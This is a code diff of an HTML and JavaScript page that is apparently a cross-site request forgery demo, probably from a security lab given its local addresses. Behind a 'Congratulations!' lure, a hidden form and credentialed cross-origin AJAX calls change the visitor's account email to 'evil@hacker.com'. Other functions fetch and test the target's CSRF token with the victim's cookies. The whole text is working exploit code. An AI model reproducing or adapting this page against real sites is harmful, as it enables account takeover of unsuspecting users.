@@ -13,11 +13,11 @@
         var enteredemail = document.getElementById('enteredemail').value; 
         var form = document.getElementById('changeemailform'); 
         document.getElementById('old_email').setAttribute('value', enteredemail); 
-        form.submit()
+        // form.submit()
 
-        /*$.ajax({
+        $.ajax({
             type: "POST",
-               url: "https://10.50.0.2:8100/changeemail",
+               url: "https://127.0.0.1:8100/changeemail",
                data: $('#changeemailform').serialize(), // serializes the form's elements.
             xhrFields: {
                   withCredentials: true
@@ -26,13 +26,13 @@
                    alert("Thank you.  We will contact you shortly") 
                },
                crossDomain: true
-             });*/
+             });
     }
 
     function getcsrftoken() {
         $.ajax({
             type: "GET",
-               url: "https://10.50.0.2:8100/getcsrftoken",
+               url: "https://127.0.0.1:8100/getcsrftoken",
             xhrFields: {
                  withCredentials: true
             },
@@ -46,7 +46,7 @@
     function testcsrftoken(token) {
         $.ajax({
             type: "POST",
-               url: "https://10.50.0.2:8100/testcsrftoken",
+               url: "https://127.0.0.1:8100/testcsrftoken",
             xhrFields: {
                  withCredentials: true
             },
@@ -69,7 +69,7 @@
             <h2>Congratulations!</h2>
 
             <div style="display: none;">
-            <form id="changeemailform" method="POST" action="https://10.50.0.2:8100/changeemail">
+            <form id="changeemailform" method="POST" action="https://127.0.0.1:8100/changeemail">
                 <input type="hidden" name="old_email" id="old_email" value="" />
                 <input type="hidden" name="new_email" id="new_email" value="evil@hacker.com" />
                 <input type="hidden" name="confirm_email" id="confirm_email" value="evil@hacker.com" />
